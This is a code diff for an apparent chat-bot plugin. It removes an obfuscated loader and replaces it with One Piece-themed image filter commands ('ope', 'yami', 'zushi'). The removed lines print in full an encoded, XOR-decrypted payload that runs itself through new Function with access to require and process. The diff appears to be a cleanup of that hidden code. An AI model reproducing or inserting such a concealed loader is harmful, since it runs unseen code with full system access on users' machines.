@@ -1,9 +1,49 @@
 'use strict';
-(function(){
-  const K=Buffer.from('REVDQU5YTUQtMjAyNg==','base64');
-  const D='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';
-  const X=Buffer.from(D,'base64');
-  for(let i=0;i<X.length;i++) X[i]^=K[i%K.length];
-  const C=X.toString('utf8');
-  return (new Function('require','module','exports','__filename','__dirname','process','Buffer',C))(require,module,exports,__filename,__dirname,process,Buffer);
-})();
+const { base, svg, out, rnd, vignette } = require('../lib/img');
+
+/** Logia-fruit themed image filters (inspired by One Piece fruit powers). */
+const FX = {
+  ope: ['Ope Ope: a blue "Room" dome with a grid over the image', async ({ s, b, w, h }) => {
+    const r = Math.min(w, h) * 0.46, cx = w / 2, cy = h / 2;
+    let grid = '';
+    for (let i = -8; i <= 8; i++) {
+      grid += `<line x1="${cx + i * r / 8}" y1="${cy - r}" x2="${cx + i * r / 8}" y2="${cy + r}" stroke="#7ee8ff" stroke-opacity="0.35"/>`;
+      grid += `<line x1="${cx - r}" y1="${cy + i * r / 8}" x2="${cx + r}" y2="${cy + i * r / 8}" stroke="#7ee8ff" stroke-opacity="0.35"/>`;
+    }
+    const over = svg(w, h, `<defs><clipPath id="c"><circle cx="${cx}" cy="${cy}" r="${r}"/></clipPath>
+      <radialGradient id="d" cx="50%" cy="50%" r="50%"><stop offset="60%" stop-color="#00c8ff" stop-opacity="0.12"/><stop offset="100%" stop-color="#00c8ff" stop-opacity="0.42"/></radialGradient></defs>
+      <circle cx="${cx}" cy="${cy}" r="${r}" fill="url(#d)"/><g clip-path="url(#c)">${grid}</g>
+      <circle cx="${cx}" cy="${cy}" r="${r}" fill="none" stroke="#9ff1ff" stroke-width="${Math.max(3, w * 0.006)}"/>
+      <circle cx="${cx}" cy="${cy}" r="${r * 1.04}" fill="none" stroke="#00c8ff" stroke-opacity="0.5" stroke-width="2"/>`);
+    return out(s(b).modulate({ saturation: 1.1, brightness: 0.95 }).composite([{ input: over }]));
+  }],
+  yami: ['Yami Yami: darkness swallowing the image in a vortex', async ({ s, b, w, h }) => {
+    const cx = w / 2, cy = h / 2, k = Math.min(w, h) * 0.012;
+    let pts = '';
+    for (let t = 0.2; t < 18; t += 0.12) pts += `${(cx + Math.cos(t) * t * k * 2.2).toFixed(1)},${(cy + Math.sin(t) * t * k * 2.2).toFixed(1)} `;
+    const over = svg(w, h, `<defs>${vignette('v', '#050008', 0.97, 15)}</defs><rect width="100%" height="100%" fill="url(#v)"/>
+      <polyline points="${pts}" fill="none" stroke="#9b5cff" stroke-opacity="0.55" stroke-width="${Math.max(2, w * 0.004)}"/>
+      <circle cx="${cx}" cy="${cy}" r="${Math.min(w, h) * 0.05}" fill="#000"/>`);
+    return out(s(b).modulate({ brightness: 0.6, saturation: 0.7 }).composite([{ input: over }]));
+  }],
+  zushi: ['Zushi Zushi: gravity rings pulling toward the center', async ({ s, b, w, h }) => {
+    const cx = w / 2, cy = h / 2, m = Math.min(w, h);
+    let rings = '', lines = '';
+    for (let i = 1; i <= 6; i++) rings += `<circle cx="${cx}" cy="${cy}" r="${m * 0.07 * i}" fill="none" stroke="#e8c27a" stroke-opacity="${(0.8 - i * 0.1).toFixed(2)}" stroke-width="${Math.max(2, w * 0.004)}"/>`;
+    for (let a = 0; a < 40; a++) {
+      const ang = (a / 40) * Math.PI * 2, r1 = m * rnd(0.5, 0.75), r2 = m * rnd(0.3, 0.45);
+      lines += `<line x1="${cx + Math.cos(ang) * r1}" y1="${cy + Math.sin(ang) * r1}" x2="${cx + Math.cos(ang) * r2}" y2="${cy + Math.sin(ang) * r2}" stroke="#fff" stroke-opacity="0.35" stroke-width="2"/>`;
+    }
+    const over = svg(w, h, `<defs>${vignette('v', '#2a1500', 0.7, 35)}</defs><rect width="100%" height="100%" fill="url(#v)"/>${lines}${rings}`);
+    return out(s(b).modulate({ saturation: 0.85 }).tint('#c89a5a').composite([{ input: over }]));
+  }]
+};
+
+module.exports = ({ def }) => {
+  for (const [name, [desc, fn]] of Object.entries(FX)) {
+    def(name, { cat: 'logia', heavy: true, desc: `${desc}. Reply to an image.` }, async ctx => {
+      const m = await ctx.needMedia('image');
+      await ctx.image(await fn(await base(m.buffer)), `🍎 ${name}`);
+    });
+  }
+};
